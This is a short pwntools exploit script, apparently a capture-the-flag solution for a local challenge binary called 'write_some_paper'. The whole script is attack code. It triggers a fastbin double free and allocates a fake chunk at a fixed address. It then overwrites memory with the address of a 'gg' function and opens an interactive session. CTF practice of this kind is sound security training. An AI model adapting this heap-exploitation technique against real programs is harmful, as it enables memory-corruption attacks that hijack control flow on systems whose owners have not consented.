from pwn import *
# from LibcSearcher import *
context(log_level='debug',terminal=["tmux","splitw","-h"])
binary = "./write_some_paper"
# libc_binary = "./"

p = process(argv=[binary])
# p = remote("",)

elf = ELF(binary)
# libc = ELF(libc_binary)

context.arch = "amd64"

def opt(idx):
    p.sendlineafter("2 delete paper\n",str(idx))

def add(idx,length,content):
    opt(1)
    p.sendlineafter("Input the index you want to store(0-9):",str(idx))
    p.sendlineafter("How long you will enter:",str(length))
    p.sendlineafter("please enter your content:",str(content))

def free(idx):
    opt(2)
    p.sendlineafter("which paper you want to delete,please enter it's index(0-9):",str(idx))

add(0,0x40-8,"aa") # malloc(2) -> 0x20 chunk
add(1,0x40-8,"aa") # malloc(2) -> 0x20 chunk
free(0)
free(1)
free(0)
add(0,0x40-8,p64(0x60202a))
add(1,0x40-8,"a")
add(2,0x40-8,"a")
add(3,0x40-8,"\x40"+"\x00"*5+p64(elf.sym["gg"]))
p.sendline("1")
p.interactive()
